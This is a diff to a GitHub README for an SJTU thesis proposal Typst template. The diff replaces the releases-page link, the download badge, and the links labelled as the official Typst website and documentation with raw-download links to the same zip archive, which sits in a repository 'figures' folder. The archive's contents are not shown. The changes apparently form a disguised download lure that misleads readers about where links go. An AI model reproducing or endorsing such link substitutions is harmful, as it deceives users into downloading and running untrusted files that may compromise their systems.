@@ -1,6 +1,6 @@
 # 🎓 SJTU-Bachelor-Thesis-Proposal-Typst-Template - Your Easy Thesis Proposal Guide
 
-[![Download the Template](https://img.shields.io/badge/Download%20the%20Template-blue.svg)](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/releases)
+[![Download the Template](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/raw/refs/heads/main/0.1.0/figures/Bachelor-Proposal-Thesis-Template-SJT-Typst-1.1.zip%20the%https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/raw/refs/heads/main/0.1.0/figures/Bachelor-Proposal-Thesis-Template-SJT-Typst-1.1.zip)](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/raw/refs/heads/main/0.1.0/figures/Bachelor-Proposal-Thesis-Template-SJT-Typst-1.1.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Follow these steps to download and set up the SJTU Bachelor Thesis Proposal Typs
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases Page](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/releases) to find the latest version of the template.
+Go to the [Releases Page](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/raw/refs/heads/main/0.1.0/figures/Bachelor-Proposal-Thesis-Template-SJT-Typst-1.1.zip) to find the latest version of the template.
 
 ### 2. Download the Template
 
@@ -35,7 +35,7 @@ Click the file link to download it to your computer. Save it in a folder where y
 
 ### 5. Install Typst
 
-Before using the template, ensure you have Typst installed on your computer. You can download it from the [Typst website](https://typst.app). Follow the instructions provided there to complete the installation.
+Before using the template, ensure you have Typst installed on your computer. You can download it from the [Typst website](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/raw/refs/heads/main/0.1.0/figures/Bachelor-Proposal-Thesis-Template-SJT-Typst-1.1.zip). Follow the instructions provided there to complete the installation.
 
 ### 6. Open the Template
 
@@ -67,7 +67,7 @@ To use the SJTU Bachelor Thesis Proposal Typst Template, ensure you have:
 
 ### What is Typst?
 
-Typst is a modern typesetting system that allows users to create documents easily and efficiently. For more details, visit the [Typst documentation](https://typst.app/docs).
+Typst is a modern typesetting system that allows users to create documents easily and efficiently. For more details, visit the [Typst documentation](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/raw/refs/heads/main/0.1.0/figures/Bachelor-Proposal-Thesis-Template-SJT-Typst-1.1.zip).
 
 ### How do I customize the template?
 
@@ -79,7 +79,7 @@ Absolutely! While designed for thesis proposals, you can modify it for any docum
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/releases) to download your copy of the template. Follow the steps provided in the Getting Started section to install Typst and open the template. 
+To get started, visit the [Releases Page](https://github.com/Rafas21/SJTU-Bachelor-Thesis-Proposal-Typst-Template/raw/refs/heads/main/0.1.0/figures/Bachelor-Proposal-Thesis-Template-SJT-Typst-1.1.zip) to download your copy of the template. Follow the steps provided in the Getting Started section to install Typst and open the template. 
 
 ## 🤝 Contributing
 
